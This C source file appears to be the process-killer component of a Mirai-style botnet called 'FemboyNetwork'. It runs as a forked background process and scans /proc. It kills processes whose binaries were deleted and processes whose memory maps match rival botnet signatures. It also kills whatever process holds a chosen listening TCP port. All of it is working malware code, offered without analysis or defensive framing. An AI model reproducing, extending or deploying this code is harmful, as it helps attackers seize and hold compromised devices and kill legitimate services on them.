#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

static BOOL is_our_binary(char *);

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;


    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;
    {
        int rp = readlink("/proc/self/exe", killer_realpath, PATH_MAX - 1);
        if (rp > 0) {
            killer_realpath[rp] = 0;
            killer_realpath_len = rp;
        }
    }

#ifdef DEBUG
	printf("[killer] FemboyNetwork setting up proc scan\n");
#endif

    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
#ifdef DEBUG
            printf("[killer] Failed to open /proc!\n");
#endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while ((file = readdir(dir)) != NULL)
        {
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char maps_path[64], *ptr_maps_path = maps_path;
            int rp_len, fd, pid = atoi(file->d_name);

            realpath[0] = 0;

            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
#ifdef DEBUG
                    printf("[killer] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
#endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);

            ptr_exe_path += util_strcpy(ptr_exe_path, "/proc/");
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, "/exe");


            ptr_maps_path += util_strcpy(ptr_maps_path, "/proc/");
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, "/smaps");

            table_lock_val(TABLE_KILLER_PROC);

            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0;

                if (pid == getpid() || pid == getppid() || is_our_binary(realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[FemboyNetwork] Deleted binary for [%s >> %d]\n", realpath, pid);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }

            if (pid != getpid() && pid != getppid() && fnbnet_match(maps_path))
            {
#ifdef DEBUG
                printf("[FemboyNetwork] Found competitor [%s >> %d]\n", realpath, pid);
#endif
                kill(pid, 9);
            } 



            util_zero(exe_path, sizeof (exe_path));
            util_zero(maps_path, sizeof (maps_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        int found_pid = util_atoi(pid, 10);
                        if (found_pid != getpid() && found_pid != getppid())
                        {
#ifdef DEBUG
                            printf("[killer] Found pid %d for port %d\n", found_pid, ntohs(port));
#else
                            kill(found_pid, 9);
#endif
                            ret = 1;
                        }
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}


static BOOL is_our_binary(char *realpath)
{
    int i, len;
    if (killer_realpath_len == 0) return FALSE;
    len = util_strlen(realpath);
    if (len < killer_realpath_len) return FALSE;
    for (i = 0; i < killer_realpath_len; i++)
        if (realpath[i] != killer_realpath[i]) return FALSE;
    if (realpath[killer_realpath_len] == 0)
        return TRUE;
    if (realpath[killer_realpath_len] == ' ' && len >= killer_realpath_len + 10)
        return util_strncmp(realpath + killer_realpath_len, " (deleted)", 10);
    return FALSE;
}

static BOOL fnbnet_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    table_unlock_val(TABLE_KILLER_HOHO);
    table_unlock_val(TABLE_KILLER_OMNI);
    table_unlock_val(TABLE_KILLER_DEMON);
    table_unlock_val(TABLE_KILLER_ZAPON);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_HOHO, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_HOHO, NULL))) || 
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_ZAPON, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_ZAPON, NULL))) || 
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_OMNI, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_OMNI, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_DEMON, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_DEMON, NULL))))
        {
            found = TRUE;
            break;
        }
    }


    table_lock_val(TABLE_KILLER_HOHO);
    table_lock_val(TABLE_KILLER_OMNI);
    table_lock_val(TABLE_KILLER_DEMON);
    table_lock_val(TABLE_KILLER_ZAPON);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
